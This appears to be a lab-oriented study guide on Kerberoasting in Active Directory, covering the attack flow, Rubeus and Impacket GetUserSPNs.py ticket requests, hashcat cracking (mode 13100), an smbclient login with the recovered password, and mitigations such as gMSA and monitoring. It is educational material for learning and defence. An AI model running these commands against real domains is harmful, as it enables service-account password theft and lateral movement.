**Kerberoasting** is a Kerberos attack where an authenticated domain user requests a **TGS (Ticket Granting Service ticket)** for a service account that has a registered **SPN (Service Principal Name)**.

Targets **service accounts with registered SPNs**.

The returned TGS contains material that can be attacked **offline** to recover the service account's password.

### Attack flow
```text
Domain User
    ↓
Find accounts with SPNs
    ↓
Request TGS
    ↓
Obtain TGS hash
    ↓
Offline cracking
    ↓
Recover service account password
    ↓
Use account for further access / privilege escalation
```

### Important

An account is generally **Kerberoastable if it has an SPN** and the attacker can request a service ticket for it.

The impact depends mainly on:
- Strength of the service account password.
- Privileges assigned to the service account.
- Whether the password is reused elsewhere.

---

# 1. Find Kerberoastable Accounts

### BloodHound

**BloodHound** can identify accounts with registered SPNs and show their privileges and relationships within the domain.

This is useful for prioritizing targets, especially when a service account has administrative privileges.

---

# 2. Kerberoasting with Rubeus

Rubeus can automatically request TGS tickets for Kerberoastable accounts and output hashes suitable for offline cracking.

### Command

```cmd
Rubeus.exe kerberoast
```

### Explanation

| Part           | Meaning                                                     |
| -------------- | ----------------------------------------------------------- |
| `Rubeus.exe`   | Execute Rubeus.                                             |
| `kerberoast`   | Find SPN-associated accounts and request their TGS tickets. |

The output contains Kerberos hashes that can be copied to the attacking machine and saved to a file such as:

```bash
hash.txt
```

#  Crack the TGS Hash

Kerberoasting hashes can be cracked offline using Hashcat.
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Check recovered passwords with:
```bash
hashcat -m 13100 hash.txt --show
```

---

# 4. Kerberoasting with Impacket

Kerberoasting can also be performed remotely using **Impacket**, so Rubeus does not need to run directly on the compromised Windows machine.

### GetUserSPNs.py

```bash
python3 GetUserSPNs.py controller.local/Machine1:Password1 \
    -dc-ip MACHINE_IP \
    -request
```

### Explanation

|Option|Meaning|
|---|---|
|`controller.local/Machine1:Password1`|Domain, username, and password used for authentication.|
|`-dc-ip MACHINE_IP`|IP address of the domain controller.|
|`-request`|Request TGS tickets for discovered SPNs.|

The tool discovers accounts with SPNs and requests their service tickets.

The resulting hashes can then be saved to:
```bash
hash.txt
```

and cracked:
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Then use the recovered service-account password:
```bash
smbclient.py 'thm.loc/Machine1:<PASSWORD>'@192.168.11.51
```


### Rubeus vs Impacket

|Tool|Where it runs|Purpose|
|---|---|---|
|Rubeus|Windows|Kerberos interaction and Kerberoasting|
|Impacket `GetUserSPNs.py`|Linux/Windows|Remote Kerberoasting|

---

# 5. After Cracking the Service Account

Recovering the service account password does **not automatically mean Domain Admin**.

The next step is to determine what the account can access.

Possible outcomes include:
- Access to systems where the account has permissions.
- Privilege escalation.
- Lateral movement.
- Access to sensitive services or shares.
- Administrative privileges if the service account was improperly privileged.

If the account is a **Domain Admin**, compromise can have domain-wide consequences.

---

# 6. Mitigation

### Use strong service account passwords

Kerberoasting relies on being able to crack the TGS offline.
Strong, random passwords make offline cracking significantly harder.

### Avoid unnecessary privileges

Service accounts should follow **least privilege**.
Do not make service accounts Domain Admins unless absolutely necessary.

### Managed service accounts

Where possible, use **gMSA (Group Managed Service Accounts)** to avoid manually managed service account passwords.

### Monitor Kerberos activity

Monitor for unusual patterns of TGS requests, especially large numbers of service-ticket requests from a single account or host.

---

# Key Point

**Kerberoasting = request TGS → extract crackable material → crack offline → recover service account password.**

The most important things to look for are:

```text
SPN → Service Account → TGS → Hash → Password → Privileges
```